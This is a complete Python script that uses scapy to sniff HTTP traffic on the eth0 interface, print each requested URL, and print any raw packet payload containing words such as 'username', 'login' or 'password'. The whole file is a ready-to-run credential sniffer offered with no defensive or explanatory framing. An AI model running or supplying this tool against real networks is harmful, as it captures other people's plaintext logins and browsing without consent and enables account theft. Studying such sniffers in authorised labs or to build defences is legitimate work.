
import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def get_url(packet):
    return str(packet[http.HTTPRequest].Host) + str(packet[http.HTTPRequest].Path)

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        url = url.strip("'b").replace("'b'","")
        print("[+] HTTP Request ---> " + url)
        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] Possible username/password ---> " + login_info + "\n\n")

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        # filter
        load = packet[scapy.Raw].load
        keywords = ["username", "user", "login", "password", "pass"]
        for keyword in keywords:
            if keyword in str(load):
                return load

sniff("eth0")


